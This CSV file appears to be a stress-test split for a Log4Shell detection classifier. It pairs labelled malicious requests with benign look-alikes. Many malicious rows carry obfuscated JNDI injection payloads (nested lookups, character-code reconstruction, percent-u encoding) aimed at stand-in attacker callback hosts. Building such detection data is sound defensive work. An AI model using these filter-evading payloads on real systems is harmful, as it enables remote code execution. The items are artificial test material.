id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
OOD-900264,2026-05-17,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fprobe.example.net%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900264,get /search?q=${jndi:ldap://probe.example.net/research}&intent=research http/1.1 trace_id=benign-ood-900264,0,benign,benign_encoded_search_query,mixed,ood_stress_test,low
OOD-900125,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${j${sys:line.separator}ndi:ldap://lab-callback.example.org/sys-separator}&request_id=ood-900125 HTTP/1.1 Host: victim.local,get /api/audit?trace=${j${sys:line.separator}ndi:ldap://lab-callback.example.org/sys-separator}&request_id=ood-900125 http/1.1 host: victim.local,1,log4shell,sys_lookup_separator,query,ood_stress_test,critical
OOD-900239,2026-05-17,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fcallback.local%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900239,get /search?q=${jndi:ldap://callback.local/research}&intent=research http/1.1 trace_id=benign-ood-900239,0,benign,benign_encoded_search_query,mixed,ood_stress_test,low
OOD-900267,2026-05-17,ood_stress_hard_negative,GET /docs/log4shell?example=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Flab-callback.example.org%u002Fdoc%u007D&mode=render-only HTTP/1.1 Host: kb.local trace_id=benign-ood-900267,get /docs/log4shell?example=%u0024%u007bjndi%u003aldap%u003a%u002f%u002flab-callback.example.org%u002fdoc%u007d&mode=render-only http/1.1 host: kb.local trace_id=benign-ood-900267,0,benign,benign_percent_u_documentation,mixed,ood_stress_test,low
OOD-900141,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${jndi:l${sys:user.name:-d}ap://lab-callback.example.org/protocol-sys}&request_id=ood-900141 HTTP/1.1 Host: victim.local,get /api/audit?trace=${jndi:l${sys:user.name:-d}ap://lab-callback.example.org/protocol-sys}&request_id=ood-900141 http/1.1 host: victim.local,1,log4shell,protocol_fragment_sys_lookup,query,ood_stress_test,critical
OOD-900010,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${j${k8s:k5:-n}d${sd:k5:-i}:ldap://evil.example/unsupported-namespace}"",""host"":""evil.example""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${j${k8s:k5:-n}d${sd:k5:-i}:ldap://evil.example/unsupported-namespace}"",""host"":""evil.example""}",1,log4shell,unsupported_lookup_namespace,json,ood_stress_test,critical
OOD-900180,2026-05-17,ood_stress_hard_negative,"INFO rendered JSON string value=""\\${jndi:ldap://attacker.evil.com/not-executed}"" source=documentation trace_id=benign-ood-900180","info rendered json string value=""\\${jndi:ldap://attacker.evil.com/not-executed}"" source=documentation trace_id=benign-ood-900180",0,benign,benign_json_escaped_payload,mixed,ood_stress_test,low
OOD-900060,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://log4j-test.invalid/unsupported-namespace}; sid=ood900060,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://log4j-test.invalid/unsupported-namespace}; sid=ood900060,1,log4shell,unsupported_lookup_namespace,cookie,ood_stress_test,critical
OOD-900108,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://probe.example.net/unsupported-namespace}; sid=ood900108,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://probe.example.net/unsupported-namespace}; sid=ood900108,1,log4shell,unsupported_lookup_namespace,cookie,ood_stress_test,critical
OOD-900026,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fattacker.evil.com%u002Fpercent-u%u007D"",""host"":""attacker.evil.com""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""%u0024%u007bjndi%u003aldap%u003a%u002f%u002fattacker.evil.com%u002fpercent-u%u007d"",""host"":""attacker.evil.com""}",1,log4shell,iis_percent_u_encoding,json,ood_stress_test,critical
OOD-900203,2026-05-17,ood_stress_hard_negative,"INFO rendered JSON string value=""\\${jndi:ldap://log4j-test.invalid/not-executed}"" source=documentation trace_id=benign-ood-900203","info rendered json string value=""\\${jndi:ldap://log4j-test.invalid/not-executed}"" source=documentation trace_id=benign-ood-900203",0,benign,benign_json_escaped_payload,mixed,ood_stress_test,low
OOD-900253,2026-05-17,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://probe.example.net separately; not a runtime lookup,info tutorial says type ${ then jndi then :ldap://probe.example.net separately; not a runtime lookup,0,benign,benign_fragmented_tutorial_text,mixed,ood_stress_test,low
OOD-900242,2026-05-17,ood_stress_hard_negative,GET /docs/log4shell?example=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fprobe.example.net%u002Fdoc%u007D&mode=render-only HTTP/1.1 Host: kb.local trace_id=benign-ood-900242,get /docs/log4shell?example=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fprobe.example.net%u002fdoc%u007d&mode=render-only http/1.1 host: kb.local trace_id=benign-ood-900242,0,benign,benign_percent_u_documentation,mixed,ood_stress_test,low
OOD-900090,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://callback.local/charcode}"",""host"":""callback.local""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://callback.local/charcode}"",""host"":""callback.local""}",1,log4shell,charcode_lookup_reconstruction,json,ood_stress_test,critical
OOD-900206,2026-05-17,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://log4j-test.invalid separately; not a runtime lookup trace_id=benign-ood-900206,info tutorial says type ${ then jndi then :ldap://log4j-test.invalid separately; not a runtime lookup trace_id=benign-ood-900206,0,benign,benign_fragmented_tutorial_text,mixed,ood_stress_test,low
OOD-900192,2026-05-17,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.evil.com%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900192,get /search?q=${jndi:ldap://attacker.evil.com/research}&intent=research http/1.1 trace_id=benign-ood-900192,0,benign,benign_encoded_search_query,mixed,ood_stress_test,low
OOD-900067,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.67 | X-Api-Version: ${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://log4j-test.invalid/charcode},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.67 | x-api-version: ${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://log4j-test.invalid/charcode},1,log4shell,charcode_lookup_reconstruction,header,ood_stress_test,critical
OOD-900215,2026-05-17,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Flog4j-test.invalid%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900215,get /search?q=${jndi:ldap://log4j-test.invalid/research}&intent=research http/1.1 trace_id=benign-ood-900215,0,benign,benign_encoded_search_query,mixed,ood_stress_test,low
OOD-900270,2026-05-17,ood_stress_hard_negative,DEBUG payload_sample=JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9hfQ== action=display_only decoded_by_ui=false trace_id=benign-ood-900270,debug payload_sample=jhtqbmrpomxkyxa6ly9legftcgxllmnvbs9hfq== action=display_only decoded_by_ui=false trace_id=benign-ood-900270,0,benign,benign_base64_artifact,mixed,ood_stress_test,low
OOD-900280,2026-05-17,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://lab-callback.example.org separately; not a runtime lookup trace_id=benign-ood-900280,info tutorial says type ${ then jndi then :ldap://lab-callback.example.org separately; not a runtime lookup trace_id=benign-ood-900280,0,benign,benign_fragmented_tutorial_text,mixed,ood_stress_test,low
OOD-900022,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${jndi:l${sys:user.name:-d}ap://evil.example/protocol-sys}"",""host"":""evil.example""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${jndi:l${sys:user.name:-d}ap://evil.example/protocol-sys}"",""host"":""evil.example""}",1,log4shell,protocol_fragment_sys_lookup,json,ood_stress_test,critical
OOD-900229,2026-05-17,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://callback.local separately; not a runtime lookup,info tutorial says type ${ then jndi then :ldap://callback.local separately; not a runtime lookup,0,benign,benign_fragmented_tutorial_text,mixed,ood_stress_test,low
OOD-900145,2026-05-17,ood_stress_hard_negative,GET /docs/log4shell?example=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fevil.example%u002Fdoc%u007D&mode=render-only HTTP/1.1 Host: kb.local,get /docs/log4shell?example=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fevil.example%u002fdoc%u007d&mode=render-only http/1.1 host: kb.local,0,benign,benign_percent_u_documentation,mixed,ood_stress_test,low
